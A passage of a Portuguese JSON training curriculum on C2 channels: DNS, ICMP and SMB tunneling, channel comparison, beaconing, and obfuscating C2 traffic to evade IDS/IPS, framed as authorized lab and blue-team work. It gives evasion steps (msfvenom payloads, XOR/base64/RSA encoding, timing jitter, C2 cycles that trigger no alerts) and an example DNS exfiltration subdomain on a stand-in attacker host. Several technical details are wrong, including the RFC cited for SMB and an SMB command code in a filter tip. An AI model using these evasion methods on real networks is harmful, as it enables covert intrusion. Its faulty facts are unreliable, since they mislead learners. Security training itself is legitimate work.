                              "practicalExample": "Em um lab com duas VMs: configure DNSCat2 no atacante (servidor DNS em dominio.com). Na vítima, inicie cliente apontando para atacantedominio.com. Envie comando 'ls -la' via túnel; dados via payload TXT fragmentado retornam como respostas A. Capture em Wireshark mostrando subdomínios como 'Y29tbWFuZD1scw==.atacante.com'.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de um comando C2 via DNS tunneling.",
                                "Identificar tunneling em um pcap Wireshark fornecido (destacar payloads codificados).",
                                "Configurar DNSCat2 do zero em <10 min.",
                                "Listar 3 limitações e 3 métodos de detecção.",
                                "Simular exfiltração de 1KB de dados via túnel.",
                                "Propor uma regra de firewall para mitigar."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de codificação e fragmentação (90%+ correto).",
                                "Demonstração prática funcional sem erros de configuração.",
                                "Análise de tráfego capturado com decoding correto.",
                                "Compreensão de limitações vs outros C2 (taxa de dados, stealth).",
                                "Criatividade em exemplos de detecção/mitigação.",
                                "Clareza na explicação de conceitos para pares."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos UDP/TCP, Wireshark análise de pacotes.",
                                "Criptografia: Codificações Base32/64, entropia em strings.",
                                "Programação: Scripts Python para decodificação DNS payloads.",
                                "Ética em Segurança: Uso ético em labs para blue/red team.",
                                "Análise de Dados: Padrões anômalos em logs DNS."
                              ],
                              "realWorldApplication": "Ataques APT como SUNBURST (SolarWinds) usaram DNS tunneling para C2 inicial; defensores monitoram logs DNS por domínios gerados dinamicamente (DGA) em ferramentas como Zeek ou Splunk para detectar beacons em infraestruturas críticas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.3",
                            "name": "Analisar canais alternativos como ICMP e SMB em C2",
                            "description": "Estudar o uso de protocolos de rede como ICMP (ping tunnels) e SMB para comunicação C2 em redes internas, destacando persistência e riscos de detecção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o uso de ICMP para comunicação C2 (Ping Tunnels)",
                                  "subSteps": [
                                    "Estudar o protocolo ICMP: estrutura de pacotes, tipos (Echo Request/Reply) e campos como data payload.",
                                    "Analisar como ICMP é abusado em C2: encapsulamento de dados em payloads de ping para bypass de firewalls.",
                                    "Explorar ferramentas como ptunnel ou icmpsh para demonstrar túneis ICMP.",
                                    "Identificar payloads maliciosos em tráfego ICMP usando Wireshark.",
                                    "Discutir limitações: baixa taxa de dados e detecção por anomalias em volume de pings."
                                  ],
                                  "verification": "Capture e decode um tráfego ICMP tunelado em Wireshark, identificando o payload C2.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Wireshark",
                                    "ptunnel ou icmpsh (em ambiente virtual)",
                                    "Documentação RFC 792 (ICMP)"
                                  ],
                                  "tips": "Use filtros Wireshark como 'icmp contains \"shell\"' para payloads suspeitos.",
                                  "learningObjective": "Explicar como ICMP é explorado para C2 stealth e identificar padrões básicos.",
                                  "commonMistakes": [
                                    "Confundir tráfego legítimo de ping com C2",
                                    "Ignorar campos de dados em ICMP Echo",
                                    "Não isolar ambiente de teste"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender o uso de SMB para comunicação C2 em redes internas",
                                  "subSteps": [
                                    "Revisar protocolo SMB: versões (SMBv1/2/3), portas (445/TCP) e operações como NTLM auth.",
                                    "Estudar abusos em C2: named pipes, transações SMB para exfiltração ou comandos (ex: Cobalt Strike SMB beacons).",
                                    "Analisar persistência via SMB shares persistentes ou scheduled tasks sobre SMB.",
                                    "Capturar tráfego SMB com Wireshark e decodificar sessões NTLM ou Tree Connect.",
                                    "Explorar ferramentas como Responder.py para simular SMB relays em C2."
                                  ],
                                  "verification": "Decode uma sessão SMB em Wireshark mostrando comandos C2 em named pipes.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Wireshark",
                                    "Impacket suite (smbclient.py)",
                                    "Metasploit SMB modules",
                                    "RFC 4172 (SMB)"
                                  ],
                                  "tips": "Filtre por 'smb.cmd == 0x72' para NT Create and X em Wireshark.",
                                  "learningObjective": "Descrever mecanismos de SMB para C2 e persistência em redes Windows.",
                                  "commonMistakes": [
                                    "Assumir SMBv1 apenas; focar em SMBv2/3",
                                    "Não diferenciar tráfego legítimo de shares",
                                    "Expor portas SMB publicamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar persistência e riscos de detecção nesses canais",
                                  "subSteps": [
                                    "Mapear técnicas de persistência: ICMP via cron jobs repetidos; SMB via registry run keys com \\pipe\\.",
                                    "Identificar IOCs: volume anormal de ICMP, SMB de hosts não-DC, user-agents suspeitos em NTLM.",
                                    "Estudar detecção: signatures YARA para payloads, anomaly detection em NIDS (Snort/Suricata rules).",
                                    "Comparar stealth: ICMP (UDP-like, firewall bypass) vs SMB (latente em AD, mas logado).",
                                    "Simular detecção com rules personalizadas em Zeek ou Suricata."
                                  ],
                                  "verification": "Criar e testar uma rule Snort para detectar ICMP com payload > 100 bytes.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Snort/Suricata",
                                    "Zeek (Bro)",
                                    "MITRE ATT&CK (T1071, T1572)",
                                    "Sysmon logs"
                                  ],
                                  "tips": "Monitore Event ID 5145 (SMB shares) para acessos anômalos.",
                                  "learningObjective": "Avaliar riscos, IOCs e métodos de detecção para ICMP/SMB C2.",
                                  "commonMistakes": [
                                    "Subestimar logging em SMB (Event Viewer)",
                                    "Ignorar ICMPv6 variantes",
                                    "Não considerar EDR bypass"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar análise e detecção em ambiente simulado",
                                  "subSteps": [
                                    "Configurar lab: VMs com Windows/Linux, rede isolada, implantar C2 ICMP/SMB (ex: Empire ou Sliver).",
                                    "Gerar tráfego C2: executar beacons e capturar PCAPs mistos com tráfego legítimo.",
                                    "Analisar PCAPs: extrair artifacts, timelines de comunicação e persistência.",
                                    "Implementar hunting: queries Splunk/ELK para IOCs, pivotar para endpoints.",
                                    "Documentar relatório: mitigações como GPO para SMB signing, ICMP rate limiting."
                                  ],
                                  "verification": "Produzir relatório com PCAP analysis e 3 IOCs extraídos de cada canal.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "Covenant/Empire framework",
                                    "Splunk Free/ELK",
                                    "PCAP samples from Malware-Traffic-Analysis"
                                  ],
                                  "tips": "Use tcpreplay para replay de PCAPs em testes repetíveis.",
                                  "learningObjective": "Aplicar análise hands-on para detectar e mitigar C2 alternativos.",
                                  "commonMistakes": [
                                    "Labs não isolados (risco real)",
                                    "Análise estática sem contexto temporal",
                                    "Falta de baseline de tráfego normal"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, um beacon C2 usa ICMP para exfiltrar dados de uma DMZ interna; usando Wireshark e Snort, o Blue Team detecta pings com payloads codificados base64 contendo comandos PowerShell, bloqueando via firewall rules.",
                              "finalVerifications": [
                                "Explicar diferenças em stealth entre ICMP e SMB C2.",
                                "Identificar 5 IOCs específicos para cada protocolo.",
                                "Criar rule de detecção funcional para Wireshark/Suricata.",
                                "Simular persistência e removê-la em lab.",
                                "Relatar mitigações efetivas por canal."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de tráfego (90%+ em labs).",
                                "Identificação correta de IOCs e riscos (sem falsos positivos).",
                                "Qualidade do relatório: estrutura, evidências PCAP.",
                                "Profundidade em substeps hands-on completados.",
                                "Conexão com MITRE ATT&CK techniques."
                              ],
                              "crossCurricularConnections": [
                                "Redes (protocolos TCP/IP análise).",
                                "Forense Digital (PCAP e log analysis).",
                                "Defesa em Camadas (NIDS/EDR integração).",
                                "Programação (scripting Wireshark filters em Lua).",
                                "Gestão de Riscos (threat modeling C2)."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, detectar C2 SMB em ataques ransomware laterais ou ICMP em APTs persistentes, permitindo isolamento rápido de beacons e redução de dwell time de ameaças."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.4",
                            "name": "Comparar eficácia de canais C2 em cenários de Red Team",
                            "description": "Avaliar trade-offs entre latência, stealth e confiabilidade de canais como TCP, UDP e WebSockets em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos dos Protocolos TCP, UDP e WebSockets",
                                  "subSteps": [
                                    "Pesquise a especificação RFC para TCP (RFC 793) e UDP (RFC 768), focando em handshakes, conexão orientada vs sem conexão.",
                                    "Estude WebSockets (RFC 6455), incluindo upgrade de HTTP e uso sobre TLS.",
                                    "Crie diagramas comparativos das camadas OSI/TCP/IP para cada protocolo.",
                                    "Identifique casos de uso típicos em C2: TCP para shells reversos, UDP para DNS tunneling, WebSockets para web shells.",
                                    "Revise exemplos de implementações em ferramentas como Cobalt Strike ou Empire."
                                  ],
                                  "verification": "Produza um resumo de 1 página com tabela comparativa de características chave (conexão, ordenação de pacotes, overhead).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "RFCs oficiais (ietf.org)",
                                    "Documentação MDN WebSockets",
                                    "Wireshark para captura de tráfego de exemplo",
                                    "Livro 'Computer Networking: A Top-Down Approach' (capítulos iniciais)"
                                  ],
                                  "tips": "Use Wireshark para capturar tráfego real de exemplos simples para visualizar diferenças.",
                                  "learningObjective": "Diferenciar precisamente as propriedades de conexão, confiabilidade e overhead de TCP, UDP e WebSockets.",
                                  "commonMistakes": [
                                    "Confundir UDP como 'inseguro' em vez de 'sem garantia de entrega'",
                                    "Ignorar que WebSockets herdam stealth de HTTPS mas adicionam overhead de framing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir e Medir Métricas de Eficácia: Latência, Stealth e Confiabilidade",
                                  "subSteps": [
                                    "Defina métricas: latência (tempo RTT), stealth (detectabilidade por IDS/IPS via signatures/anomalias), confiabilidade (taxa de perda de pacotes/retransmissões).",
                                    "Configure benchmarks: use ferramentas como iperf para latência TCP/UDP, custom scripts para WebSockets.",
                                    "Aprenda detecção: signatures YARA para beacons TCP, entropia para UDP tunneling, WebSocket framing anomalies.",
                                    "Crie planilha para registrar métricas em cenários variados (alta latência rede, firewalls).",
                                    "Simule ruído: adicione jitter e perda de pacotes com tc/netem no Linux."
                                  ],
                                  "verification": "Desenvolva um script Python simples que meça RTT para TCP/UDP e liste 3 indicadores de stealth por canal.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "iperf3 (ferramenta de benchmark)",
                                    "Python com bibliotecas socket e websocket-client",
                                    "tc/netem no Linux para simulação de rede",
                                    "Snort ou Suricata rules para detecção C2"
                                  ],
                                  "tips": "Sempre teste em rede isolada (VMs) para evitar falsos positivos em produção.",
                                  "learningObjective": "Quantificar trade-offs usando métricas padronizadas para avaliação objetiva.",
                                  "commonMistakes": [
                                    "Medir latência sem considerar payload size variável",
                                    "Subestimar stealth de WebSockets em tráfego HTTPS legítimo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e Testar Canais C2 em Ambiente Controlado",
                                  "subSteps": [
                                    "Configure lab: 2 VMs (atacante/vítima) com Metasploit ou Covenant para C2 TCP/UDP.",
                                    "Implemente WebSockets C2 usando ws library em Python ou Sliver framework.",
                                    "Execute testes: envie comandos/beacons, registre latência (time.perf_counter), perdas e detecções.",
                                    "Varie cenários: rede com firewall (pfSense), alta latência (WAN simulado), monitoramento com Zeek.",
                                    "Colete dados: exporte logs para CSV com métricas por canal."
                                  ],
                                  "verification": "Gere relatório com gráficos (matplotlib) de latência vs confiabilidade para 3 rodadas de testes.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "VirtualBox/VMware com Kali Linux e Windows victim",
                                    "Metasploit, Covenant ou Empire para C2 frameworks",
                                    "Zeek/Suricata para monitoramento",
                                    "Python com pandas/matplotlib para análise"
                                  ],
                                  "tips": "Use profiles customizados em frameworks C2 para alternar canais rapidamente.",
                                  "learningObjective": "Implementar e testar canais C2 em lab, coletando dados empíricos.",
                                  "commonMistakes": [
                                    "Não isolar lab, causando alertas em honeypots globais",
                                    "Ignorar overhead de criptografia em WebSockets"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Trade-offs e Comparar Eficácia em Cenários Red Team",
                                  "subSteps": [
                                    "Analise dados: crie matriz de decisão (Excel) com scores ponderados por cenário (ex: stealth > latência em corporate net).",
                                    "Simule Red Team: stealth-heavy (WebSockets), speed-heavy (UDP), reliable-heavy (TCP).",
                                    "Discuta trade-offs: TCP detectável mas confiável; UDP rápido mas frágil; WebSockets balanced mas browser-dependent.",
                                    "Valide com case studies: APT groups (ex: Cobalt Strike TCP vs DNS UDP).",
                                    "Documente recomendações: 'Use WebSockets para pivot em web apps'."
                                  ],
                                  "verification": "Escreva relatório final de 2 páginas com tabela de comparação e recomendação por cenário.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Excel/Google Sheets para matriz",
                                    "Relatórios MITRE ATT&CK (T1071 C2)",
                                    "Case studies de Red Team reports (Offensive Security)"
                                  ],
                                  "tips": "Pondere métricas baseado no TTP do adversary (ex: 40% stealth para persistência longa).",
                                  "learningObjective": "Sintetizar dados em comparações acionáveis para decisões Red Team.",
                                  "commonMistakes": [
                                    "Generalizar sem contexto de rede (ex: UDP falha em NAT)",
                                    "Omitir custo computacional de WebSockets em IoT"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício Red Team simulando infiltração em rede corporativa: configure C2 TCP (alta confiabilidade para exfil mas detectável por conexões persistentes), UDP (baixa latência para comandos rápidos mas 20% perda em WAN), WebSockets sobre HTTPS (alta stealth em tráfego web normal, latência média 50ms). Compare: TCP falha em evasão, UDP em firewalls stateful, WebSockets vence em blend-in.",
                              "finalVerifications": [
                                "Explicar verbalmente trade-offs TCP vs UDP em 1 minuto.",
                                "Identificar cenário ideal para cada canal (ex: UDP para DoS C2).",
                                "Analisar pcap de Wireshark e classificar canal C2 corretamente.",
                                "Recomendar canal para 'persistência stealth em enterprise'.",
                                "Listar 3 mitigações Blue Team por canal.",
                                "Simular falha: prever impacto de perda 30% em UDP C2."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de métricas (latência <10ms erro).",
                                "Dados empíricos de testes (mínimo 3 cenários).",
                                "Matriz comparativa completa com scores quantitativos.",
                                "Análise de trade-offs contextualizada a Red Team.",
                                "Relatório claro com visualizações e recomendações acionáveis.",
                                "Demonstração prática de setup C2 em lab."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de transporte e análise de tráfego.",
                                "Programação: Sockets e WebSockets em Python/Go.",
                                "Criptografia: TLS para stealth em WebSockets.",
                                "Inteligência de Ameaças: MITRE ATT&CK T1071.",
                                "Análise Forense: Detecção com NIDS como Suricata."
                              ],
                              "realWorldApplication": "Durante pentests Red Team autorizados, como em engajamentos OSCP ou contratos governamentais, selecionar o canal C2 ótimo (ex: WebSockets para bypass de WAF) permite manter acesso persistente sem detecção, maximizando tempo-on-target e sucesso em objetivos como lateral movement."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.3",
                        "name": "Mecanismos de Persistência e Evasão em C2",
                        "description": "Técnicas para manter comunicação estável e evitar detecção por ferramentas de Blue Team, como SIEM e EDR.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.3.1",
                            "name": "Entender beaconing e callbacks em C2",
                            "description": "Descrever intervalos de beaconing (check-ins periódicos) e callbacks sob demanda para reduzir footprint, com configurações em frameworks como Covenant.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Fundamentais de C2, Beaconing e Callbacks",
                                  "subSteps": [
                                    "Ler definições de Comando e Controle (C2) em contextos de segurança cibernética.",
                                    "Identificar beaconing como check-ins periódicos do agente para o servidor C2.",
                                    "Diferenciar callbacks como comunicações sob demanda iniciadas pelo servidor.",
                                    "Analisar como esses mecanismos reduzem o footprint de rede.",
                                    "Estudar exemplos iniciais de frameworks como Covenant."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito os conceitos básicos e suas diferenças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação oficial do Covenant (GitHub)",
                                    "Artigos sobre C2 em OWASP ou MITRE ATT&CK",
                                    "Vídeo introdutório sobre C2 frameworks (YouTube)"
                                  ],
                                  "tips": [
                                    "Use diagramas para visualizar o fluxo de comunicação.",
                                    "Compare com comunicação HTTP normal para entender a sutileza."
                                  ],
                                  "learningObjective": "Compreender os termos fundamentais e seu propósito em operações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir beaconing com polling constante sem intervalos.",
                                    "Ignorar o aspecto de evasão de detecção em IDS/IPS."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Beaconing em Detalhe",
                                  "subSteps": [
                                    "Configurar intervalos de beaconing (ex: 30s a 5min) para minimizar tráfego.",
                                    "Simular cenários de jitter (variação aleatória) para evitar padrões detectáveis.",
                                    "Analisar impacto no footprint: tráfego reduzido vs. responsividade.",
                                    "Testar em ambiente controlado com ferramentas como Wireshark.",
                                    "Documentar configurações típicas em Covenant."
                                  ],
                                  "verification": "Demonstrar uma configuração de beaconing com jitter e capturar tráfego de rede.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Instalação local do Covenant",
                                    "Wireshark para captura de pacotes",
                                    "VM para ambiente de teste (VirtualBox)"
                                  ],
                                  "tips": [
                                    "Comece com intervalos longos para observar redução de ruído.",
                                    "Registre métricas de tráfego antes/depois."
                                  ],
                                  "learningObjective": "Dominar configurações de beaconing e seus benefícios evasivos.",
                                  "commonMistakes": [
                                    "Definir jitter muito baixo, criando padrões previsíveis.",
                                    "Esquecer de considerar latência em redes reais."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Callbacks Sob Demanda",
                                  "subSteps": [
                                    "Entender callbacks como respostas a comandos específicos do servidor C2.",
                                    "Configurar listeners no Covenant para disparar callbacks.",
                                    "Comparar com beaconing: zero tráfego até acionado.",
                                    "Simular um callback para execução de payload.",
                                    "Avaliar trade-offs: stealth vs. delay em comandos."
                                  ],
                                  "verification": "Executar um callback manual e verificar ausência de tráfego periódico.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Servidor Covenant rodando",
                                    "Grunt implant configurado",
                                    "Scripts de teste para comandos C2"
                                  ],
                                  "tips": [
                                    "Use comandos leves para testar latência de callback.",
                                    "Monitore logs do Covenant para confirmações."
                                  ],
                                  "learningObjective": "Aplicar callbacks para comunicações eficientes e discretas.",
                                  "commonMistakes": [
                                    "Confundir callback com beaconing unidirecional.",
                                    "Não testar em rede com firewall para validar evasão."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurações Avançadas em Frameworks e Análise de Evasão",
                                  "subSteps": [
                                    "Implementar híbrido beaconing + callbacks no Covenant.",
                                    "Ajustar perfis para diferentes cenários (ex: alta segurança).",
                                    "Analisar detecção por EDR/SIEM e contramedidas.",
                                    "Documentar melhores práticas para redução de footprint.",
                                    "Realizar um teste end-to-end."
                                  ],
                                  "verification": "Apresentar relatório com configurações, capturas e análise de footprint.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Covenant Dashboard",
                                    "Ferramentas de análise: Zeek ou Suricata",
                                    "Documentação MITRE ATT&CK T1071"
                                  ],
                                  "tips": [
                                    "Varie protocolos (HTTP/HTTPS/DNS) para realismo.",
                                    "Meça footprint em bytes/segundo."
                                  ],
                                  "learningObjective": "Integrar mecanismos em frameworks reais para operações evasivas.",
                                  "commonMistakes": [
                                    "Over-configurar, aumentando visibilidade desnecessária.",
                                    "Ignorar user-agent e headers para mimetização."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de red team, implante um Grunt no Covenant com beaconing de 2 minutos + jitter 30% e callbacks para comandos como 'shell'. Monitore com Wireshark: tráfego cai 90% comparado a polling constante, permitindo persistência sem alertas em SIEM básico.",
                              "finalVerifications": [
                                "Descrever diferenças entre beaconing e callbacks com exemplos.",
                                "Configurar e demonstrar beaconing com jitter no Covenant.",
                                "Executar callback sob demanda e capturar tráfego zero fora do evento.",
                                "Calcular redução de footprint em um cenário simulado.",
                                "Explicar detecção comum e contramedidas.",
                                "Documentar configuração híbrida funcional."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (80%+ acerto em definições).",
                                "Capacidade prática de configuração no Covenant.",
                                "Análise quantitativa de footprint (métricas corretas).",
                                "Identificação de erros comuns e soluções.",
                                "Relatório claro com diagramas e evidências.",
                                "Compreensão de evasão vs. detecção."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores (protocolos HTTP/DNS, análise de tráfego).",
                                "Programação (C# no Covenant, scripts de automação).",
                                "Análise de Malware (persistência e IOCs).",
                                "Ética e Direito Cibernético (uso em pentests legais).",
                                "Inteligência de Ameaças (MITRE ATT&CK frameworks)."
                              ],
                              "realWorldApplication": "Em operações de jogos de guerra cibernética ou pentests, beaconing/callbacks mantêm acesso persistente em redes corporativas sem disparar alertas de IDS, permitindo coleta de dados ou execução de payloads com mínimo footprint, como visto em campanhas APT reais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.2",
                            "name": "Implementar técnicas de ofuscação em comunicações C2",
                            "description": "Explorar codificação de payloads, criptografia assimétrica e jitter em timings para evasão de IDS/IPS, baseado em práticas de ethical hacking.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Ofuscação em Comunicações C2",
                                  "subSteps": [
                                    "Estude os conceitos básicos de comunicações C2 e como IDS/IPS detectam padrões como payloads fixos, tráfego periódico e assinaturas conhecidas.",
                                    "Analise exemplos de tráfego C2 não ofuscado usando Wireshark para identificar padrões detectáveis.",
                                    "Revise princípios de evasão: codificação, criptografia e variação temporal.",
                                    "Documente ameaças comuns de detecção em um diagrama de fluxo.",
                                    "Pesquise frameworks éticos como Cobalt Strike ou Empire para contextos de simulação."
                                  ],
                                  "verification": "Crie um relatório de 1 página resumindo 3 padrões detectáveis e como ofuscação os mitiga.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Wireshark",
                                    "Documentação de Cobalt Strike/Empire",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use capturas de pacotes reais de labs éticos para visualização prática.",
                                  "learningObjective": "Compreender os mecanismos de detecção de IDS/IPS em C2 para motivar técnicas de ofuscação.",
                                  "commonMistakes": [
                                    "Ignorar contexto ético, assumindo uso ofensivo",
                                    "Confundir ofuscação com criptografia forte",
                                    "Não analisar tráfego real"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Codificação de Payloads",
                                  "subSteps": [
                                    "Gere um payload C2 simples em Python ou usando msfvenom.",
                                    "Aplique codificações base64, XOR ou RC4 para ofuscar o conteúdo.",
                                    "Crie um script encoder/decodificador personalizado.",
                                    "Teste a decodificação no lado do agente C2.",
                                    "Varie chaves de codificação dinamicamente por sessão."
                                  ],
                                  "verification": "Envie um payload codificado via netcat e confirme decodificação correta sem detecção básica.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python 3",
                                    "Metasploit (msfvenom)",
                                    "Netcat",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Combine múltiplas codificações em camadas para maior evasão.",
                                  "learningObjective": "Dominar codificação para mascarar payloads de scanners de assinatura.",
                                  "commonMistakes": [
                                    "Usar codificações fracas como base64 sozinha",
                                    "Não testar decodificação em runtime",
                                    "Reutilizar chaves estáticas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Criptografia Assimétrica em C2",
                                  "subSteps": [
                                    "Gere pares de chaves RSA ou ECC usando OpenSSL.",
                                    "Implemente handshake inicial: agente envia chave pública, servidor assina respostas.",
                                    "Criptografe payloads com chave pública do servidor e descriptografe com privada.",
                                    "Integre em um script C2 beacon simples.",
                                    "Valide integridade com HMAC ou assinaturas digitais."
                                  ],
                                  "verification": "Capture tráfego criptografado no Wireshark e confirme que payloads são ilegíveis sem chaves.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "OpenSSL",
                                    "Python com cryptography library",
                                    "Wireshark"
                                  ],
                                  "tips": "Use curvas elípticas (ECC) para chaves menores e performance melhor em beacons.",
                                  "learningObjective": "Implementar criptografia assimétrica para proteger comunicações C2 contra interceptação.",
                                  "commonMistakes": [
                                    "Expor chaves privadas",
                                    "Não rotacionar chaves periodicamente",
                                    "Ignorar overhead de performance"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Introduzir Jitter em Timings para Evasão Temporal",
                                  "subSteps": [
                                    "Calcule intervalos beacon padrão (ex: 60s) e identifique padrões detectáveis.",
                                    "Implemente jitter randômico: multiplique intervalo por fator [0.8, 1.2].",
                                    "Adicione delays variáveis baseados em eventos (ex: CPU load).",
                                    "Teste com script simulando múltiplos beacons.",
                                    "Ajuste parâmetros para equilibrar stealth e responsividade."
                                  ],
                                  "verification": "Gere logs de timings e confirme variância >20% sem picos detectáveis.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Python com random e time modules",
                                    "Ferramentas de análise temporal como tcpdump"
                                  ],
                                  "tips": "Monitore detecções em ferramentas como Zeek para refinar jitter.",
                                  "learningObjective": "Evadir detecções baseadas em padrões temporais usando variabilidade randômica.",
                                  "commonMistakes": [
                                    "Jitter excessivo causando timeouts",
                                    "Jitter previsível (ex: sempre +10%)",
                                    "Não sincronizar com relógio NTP"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar e Testar Ofuscação Completa Contra IDS/IPS",
                                  "subSteps": [
                                    "Combine codificação, criptografia e jitter em um framework C2 unificado.",
                                    "Configure ambiente de teste com Snort ou Suricata simulando IDS.",
                                    "Execute simulação de campanha C2 e monitore alertas.",
                                    "Ajuste parâmetros baseados em detecções observadas.",
                                    "Documente regras de IDS bypassadas."
                                  ],
                                  "verification": "Execute 10 ciclos C2 sem alertas em IDS simulado; capture e analise tráfego.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Snort/Suricata em VM",
                                    "Framework C2 como Sliver ou custom Python",
                                    "VirtualBox/VMware"
                                  ],
                                  "tips": "Use regras de IDS open-source para testes realistas; sempre em ambiente isolado.",
                                  "learningObjective": "Integrar técnicas de ofuscação em um sistema C2 funcional e evasivo.",
                                  "commonMistakes": [
                                    "Testar só localmente sem rede simulada",
                                    "Ignorar detecções comportamentais",
                                    "Não limpar artefatos pós-teste"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de ethical hacking, configure um servidor C2 em Python. Gere payload beacon codificado em XOR+base64, criptografado com RSA (chave pública do servidor), com jitter de 30-90s. Implante agente em VM vítima, conecte via HTTP/HTTPS ofuscado. Use Wireshark para capturar e confirme evasão de Snort rules para 'suspicious beaconing'.",
                              "finalVerifications": [
                                "Payloads são codificados/descriptografados corretamente em runtime.",
                                "Tráfego é criptografado e ilegível sem chaves privadas.",
                                "Timings exibem variância randômica sem padrões detectáveis.",
                                "Sistema C2 completo mantém persistência sem alertas em IDS simulado.",
                                "Relatório inclui análise de bypass de 3+ regras específicas.",
                                "Ambiente de teste é limpo e isolado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação de cada técnica (codificação, crypto, jitter).",
                                "Eficácia comprovada contra IDS/IPS em testes simulados.",
                                "Código limpo, comentado e modular.",
                                "Análise de riscos e limitações documentada.",
                                "Adesão a princípios éticos (uso apenas em labs autorizados).",
                                "Eficiência: baixa latência com alta evasão."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Scripts Python para automação de crypto e timing.",
                                "Redes: Análise de protocolos com Wireshark/tcpdump.",
                                "Criptografia: Princípios de assimétrica e integridade.",
                                "Análise de Malware: Comportamentos de beacons reais.",
                                "Ética em TI: Abordagem responsável em simulações de ataque."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante pentests autorizados, essas técnicas permitem simular APTs reais, testando defesas de IDS/IPS sem detecção prematura, ajudando organizações a fortalecer detecções de C2 em ambientes de produção."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.3",
                            "name": "Analisar detecção de IOCs em canais C2",
                            "description": "Identificar indicadores como user-agents anômalos, domínios gerados e padrões de tráfego, preparando para threat hunting conforme Blue Team Handbook.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender IOCs Comuns em Canais C2",
                                  "subSteps": [
                                    "Estude definições de IOCs como user-agents anômalos (ex: strings customizadas de malware), domínios DGA e padrões de tráfego beaconing.",
                                    "Revise exemplos do Blue Team Handbook: tráfego HTTP/HTTPS para domínios suspeitos, DNS queries para subdomínios aleatórios.",
                                    "Classifique IOCs por tipo: rede (IPs, portas), host (artefatos de memória), behavioral (padrões temporais).",
                                    "Analise diagramas de fluxos C2 típicos (ex: pull-based vs push-based).",
                                    "Crie uma tabela pessoal de 10 IOCs comuns com exemplos reais de malwares como Cobalt Strike ou Emotet."
                                  ],
                                  "verification": "Capacidade de listar e explicar 5 IOCs específicos com exemplos sem consultar materiais.",
                                  "estimatedTime": "1.5 hours",
